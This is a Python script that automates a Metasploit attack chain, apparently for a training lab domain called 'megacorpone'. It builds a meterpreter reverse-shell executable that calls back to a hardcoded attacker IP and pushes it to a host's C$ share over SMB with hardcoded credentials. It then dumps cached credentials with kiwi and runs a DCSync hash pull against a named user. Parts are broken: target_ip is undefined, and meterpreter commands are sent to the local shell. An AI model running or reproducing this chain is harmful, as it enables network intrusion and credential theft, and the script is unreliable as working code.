import os
import subprocess
import logging

METASPLOIT_PATH = '/usr/share/metasploit-framework'
RESOURCE_SCRIPTS = [
    '~/resource1.rc',
    '~/resource2.rc',
    '~/resource3.rc',
    '~/resource4.rc',
    '~/resource5.rc'
]

ATTACKER_IP = '172.22.117.100'
LOG_FILE = 'exploit_log.txt'

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def execute_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    return output.decode(), error.decode()

def download_resource_scripts():
    for script in RESOURCE_SCRIPTS:
        command = f'curl -O {script}'
        execute_command(command)

def generate_msfshell_exe():
    msfvenom_command = f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ATTACKER_IP} LPORT=4444 -f exe > msfshell.exe'
    execute_command(msfvenom_command)

def handle_meterpreter_session():
    while True:
        command = input("Enter a command ('leave' to return to script execution): ")
        if command == 'leave':
            break
        execute_command(f'{METASPLOIT_PATH}/msfconsole -x "{command}"')

def log_info(message):
    logging.info(message)
    print(message)

def log_error(message):
    logging.error(message)
    print(f'[ERROR] {message}')

def main():
    try:
        # Download resource scripts
        log_info('Downloading resource scripts...')
        download_resource_scripts()

        # Generate msfshell.exe
        log_info('Generating msfshell.exe...')
        generate_msfshell_exe()

        # Handle meterpreter session
        #log_info('Handling meterpreter session...')
        #handle_meterpreter_session()

        # Execute resource1.rc
        log_info('Executing resource1.rc...')
        execute_command(f'{METASPLOIT_PATH}/msfconsole -r ~/resource1.rc')

        # SMBClient section
        log_info('Handling SMBClient session...')
        smb_command = f'smbclient //{target_ip}/C$ -U megacorpone/tstark -c "password=Password!; put msfshell.exe; exit"'
        execute_command(smb_command)

        # Execute resource2.rc
        log_info('Executing resource2.rc...')
        execute_command(f'{METASPLOIT_PATH}/msfconsole -r ~/resource2.rc')

        # Background resulting meterpreter session
        log_info('Backgrounding meterpreter session...')
        execute_command('background')

        # Execute resource3.rc
        log_info('Executing resource3.rc...')
        execute_command(f'{METASPLOIT_PATH}/msfconsole -r ~/resource3.rc')

        # Enter "shell" in resulting meterpreter session
        log_info('Entering "shell" in meterpreter session...')
        execute_command('shell')

        # Execute "schtasks" command
        log_info('Executing "schtasks" command...')
        execute_command('schtasks')

        # Exit shell to meterpreter
        log_info('Exiting shell to meterpreter...')
        execute_command('exit')

        # Exit meterpreter
        log_info('Exiting meterpreter session...')
        execute_command('exit')

        # Execute resource4.rc
        log_info('Executing resource4.rc...')
        execute_command(f'{METASPLOIT_PATH}/msfconsole -r ~/resource4.rc')

        # Load kiwi
        log_info('Loading kiwi...')
        execute_command('load kiwi')

        # Use kiwi command kiwi_cmd lsadump::cache
        log_info('Executing kiwi command "kiwi_cmd lsadump::cache"...')
        execute_command('kiwi_cmd lsadump::cache')

        # Exit meterpreter
        log_info('Exiting meterpreter session...')
        execute_command('exit')

        # Execute resource5.rc
        log_info('Executing resource5.rc...')
        execute_command(f'{METASPLOIT_PATH}/msfconsole -r ~/resource5.rc')

        # Enter command "sysinfo"
        log_info('Entering "sysinfo" command...')
        execute_command('sysinfo')

        # Enter command "shell"
        log_info('Entering "shell" command...')
        execute_command('shell')

        # Enter command "net users"
        log_info('Entering "net users" command...')
        execute_command('net users')

        # Exit shell into meterpreter
        log_info('Exiting shell into meterpreter...')
        execute_command('exit')

        # Load kiwi
        log_info('Loading kiwi...')
        execute_command('load kiwi')

        # Enter kiwi command "dcsync_ntlm cdanvers"
        log_info('Entering kiwi command "dcsync_ntlm cdanvers"...')
        execute_command('dcsync_ntlm cdanvers')

    finally:
        # Cleanup logic goes here
        pass

if __name__ == "__main__":
    main()
